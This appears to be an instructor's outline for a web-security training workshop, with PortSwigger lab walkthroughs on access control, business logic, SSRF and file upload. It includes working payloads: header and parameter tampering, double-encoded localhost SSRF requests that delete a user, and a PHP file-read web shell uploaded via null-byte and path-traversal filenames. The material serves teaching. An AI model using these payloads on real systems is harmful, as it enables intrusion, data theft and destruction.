# Intro

Quick intro from instructors

## Getting Started 

Make sure all students have access to the Kali station and are fully functional.  Give an overview of what we are going to workshop, why we chose the topics (OWASP and personal fav's).

## Methodology
Talk about broad methodology, this is not meant to get you pulling bounties from H1 or Synack but more to have cognizance of common web app mistakes and a good understanding of how each bug class is exploited

## Asset Discovery
Asset discovery is about assessing an organization's attack surface through the lens of application security. A motivated actor will spend days discovering all of your endpoints through a myriad of methods, hence you should be aware of what assets you're leaving out there. 

A forgotten or misplaced asset can be the foothold an attacker needs to pivot deeper into your network.

Here are a few recon tools and techniques you should be aware of when staging test environments that touch the internet:
* Passive Recon Tools
  * Shodan & Censys constantly crawl the internet and provide a searchable database for attackers to passively surveil your external network.
  * SSL cert registries like crt.sh will record domain names (even internal ones).
  * Wayback Machine & Alienvault provide a glimpse at older versions of applications.
* Active Recon Tools
  * Amass: combines ASN, SSL certificates, historical online databases and DNS records to map your online presence.
  * Massscan/nmap: Quickly performs port scans against a large number of assets.
  * Feroxbuster/ffuf: Perform forced browsing and quickly discover unprotected and potentially sensitive directories.

## Identifying Data Entry Points
Attackers generally want to break a mixture of Confidentiality, Integrity, or Availability (CIA) and thus our approach should focus on answering questions similar to the following:
* Does this data entry point allow us to affect the integrity of the application's data?
* Can we abuse this functionality to cause a denial of service?
* Should this information be available to us? Can we circumvent an access control to access confidential information?

Ultimately the answers to these questions depend on what the organization defines as acceptable. Hence, it is generally a good idea to identify what types of information the organization cares about before assessing application security. For instance, if the organization is a government entity, they may not care if someone can abuse an IDOR bug to retrieve public documents because they are intended to be viewed by everyone. We should narrow our focus on endpoints and bug classes that can impact one of the pillars of the CIA triad in a meaningful way.

Finding these data entry points is typically accomplished by crawling the site with something like [gospider](https://github.com/jaeles-project/gospider) which will recursively follow links of a given URL. The output can be searched for query parameters, web forms, and API endpoints. This data can also be supplimented by web archive queries, which serve to provide a snapshot of an older version of an application.

Lastly, JavaScript files are typically a gold mine for API endpoints and can contain sensitive keys or reveal how adminitrative functions work without requiring access to restricted administrative content. These files can also trivialize the parameter mining process and lead to access control bypasses. 

## Discussion Broken Access Controls (10 Mins)
Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits

### Demo (2 Mins)

Enumerate site, nothing really on the main page.  Check out robots.txt and see that the admin panel is listed and navigate to it

notice this in the source /admin-al12ax and navigate to it

//walkthrough
add X-Original-URL: /admin to request and see the difference
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete

## Discussion Business Logic Vulnerabilities (10 Mins)
Most security problems are weaknesses in an application that result from a broken or missing security control (authentication, access control, input validation, etcâ€¦). By contrast, business logic vulnerabilities are ways of using the legitimate processing flow of an application in a way that results in a negative consequence to the organization.

log in with weiner : peter and add the jacket to your cart, check the http history and give it a look, if you go negative with it you can get a negative balance and then you can balance out the transaction

Add to cart, then modify the price parameter
productId=1&redir=PRODUCT&quantity=1&price=1

## Discussion Injection (10 Mins)
An application is vulnerable to attack when:

- User-supplied data is not validated, filtered, or sanitized by the application.

- Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.

- Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.

- Hostile data is directly used or concatenated. The SQL or command contains the structure and malicious data in dynamic queries, commands, or stored procedures.

## Discussion Server Side Request Forgery (10 Mins)
SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

### Demo (2 Mins)
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

//walkthrough
Admin interface only available if logged in as an administrator, or if requested from loopback
check the stock and look at the request, modify the stockAPI parameter 

```
first try this to get the delete user url
stockApi=http://localhost/admin/

then try this to delete the user
stockApi=http://localhost/admin/delete?username=carlos

```

### Instructor Solution (2 Mins)
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter


//walkthrough
do it like the last one but you get this:
"External stock check blocked for security reasons"

by the response we can tell this is probably a blocklist so lets try something different

try this...still blocked..
stockApi=http://127.1/admin

What about double encoding?
stockApi=http://127.1/%2561%64mi%6e

And finally
http://127.1/%2561%64mi%6e/delete?username=carlos

## Discussion File Upload (10 Mins)
Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.

The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement. It depends on what the application does with the uploaded file and especially where it is stored.

### Demo (2 Mins)
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

//walkthrough
create file exploit.php containing below
```
<?php echo file_get_contents('/home/carlos/secret'); ?>

```
try to upload it and you get rejected, 
upload a blank .jpeg and copy image location in another tab
then intercept another upload request and swap filename filename="exploit.php%00.jpg"
in the get avatar link tab swap the request to exploit.php

### Instructor Solution (2 Mins)
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

//walkthrough  

Do your normal upload and check it out, when you navigate to the exploit.php you notice that it doesn't actually execute the php because that directory is protected

Intercept the POST request and modify the content line to this:
```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

modify your GET request to call the next directory up
```
GET /files/exploit.php HTTP/1.1
```


## CTF TIME!!!
